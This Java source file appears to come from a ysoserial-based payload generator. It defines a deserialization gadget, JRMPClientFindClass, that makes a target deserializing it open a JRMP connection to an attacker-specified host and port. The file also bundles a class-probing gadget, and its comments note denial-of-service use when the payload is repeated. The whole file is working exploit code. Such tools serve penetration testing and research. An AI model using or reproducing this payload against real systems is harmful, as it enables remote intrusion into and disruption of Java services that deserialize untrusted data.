package me.gv7.woodpecker.yso.payloads;


import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.LinkedList;
import java.util.Random;


/**
 *
 *
 * UnicastRef.newCall(RemoteObject, Operation[], int, long)
 * DGCImpl_Stub.dirty(ObjID[], long, Lease)
 * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
 * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Thread.start()
 * DGCClient$EndpointEntry.<init>(Endpoint)
 * DGCClient$EndpointEntry.lookup(Endpoint)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - host:port to connect to, host only chooses random port (DOS if repeated many times)
 *
 * Yields:
 * * an established JRMP connection to the endpoint (if reachable)
 * * a connected RMI Registry proxy
 * * one system thread per endpoint (DOS)
 *
 * @author mbechler
 */
@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER })
public class JRMPClientFindClass extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClientFindClass.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        LinkedList<Object> ok = new LinkedList<Object>();
        ok.add(URLDNSFindClass.makeClass("okkk"));
        ok.add(proxy);
        return ok;
    }


    public static void main ( final String[] args ) throws Exception {
        //Thread.currentThread().setContextClassLoader(JRMPClientFindClass.class.getClassLoader());
        //PayloadRunner.run(JRMPClientFindClass.class, args);
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("x.ser"));
//        objectOutputStream.writeObject(new JRMPClientFindClass().getObject("127.0.0.1:6666"));
//        objectOutputStream.flush();
//        objectOutputStream.close();



        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("x.ser"));
        objectInputStream.readObject();
    }
}
